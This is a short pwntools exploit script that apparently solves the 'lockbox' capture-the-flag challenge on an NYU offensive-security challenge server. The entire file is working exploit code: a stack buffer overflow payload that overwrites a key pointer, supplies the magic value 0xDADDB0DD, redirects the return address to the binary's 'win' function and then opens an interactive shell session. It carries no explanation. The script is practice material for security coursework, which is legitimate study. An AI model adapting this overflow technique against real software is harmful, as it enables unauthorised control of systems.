from pwn import *
local=False

context.log_level="DEBUG"
context.terminal=["tmux", "splitw", "-h", "-f"]
if local:
    p=gdb.debug("./lockbox", '''
                            break main
                            continue
                            ''')
else:
    p=remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1336)
                        
e = ELF("./lockbox")
jump_to_addr = e.symbols["win"]
log.info("jump: " + str(jump_to_addr))
key_addr = e.symbols["key"]
log.info("key: " + str(key_addr))

p.recvuntil(b"combination?\n> ")
p.send(b"A"*0x10 + key_addr.to_bytes(8, "little") + (0xDADDB0DD).to_bytes(8, "little") + b"A"*0x28 + jump_to_addr.to_bytes(8, "little") + b"\n")
p.interactive()
